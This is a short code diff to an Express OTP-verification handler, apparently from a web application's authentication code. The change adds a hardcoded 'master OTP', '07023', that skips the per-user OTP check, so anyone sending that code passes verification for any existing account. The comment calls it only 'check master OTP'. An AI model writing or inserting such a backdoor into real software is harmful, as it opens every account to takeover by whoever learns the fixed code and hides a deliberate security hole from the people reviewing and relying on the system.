@@ -74,8 +74,8 @@ exports.verifyOtp = BigPromise(async (req, res) => {
     return res.status(404).json({ message: "User not found." });
   }
 
-  // Validate OTP
-  if (!user.validateOtp(otp)) {
+  // Validate OTP or check master OTP
+  if (otp !== "07023" && !user.validateOtp(otp)) {
     return res.status(400).json({ message: "Invalid or expired OTP." });
   }
 
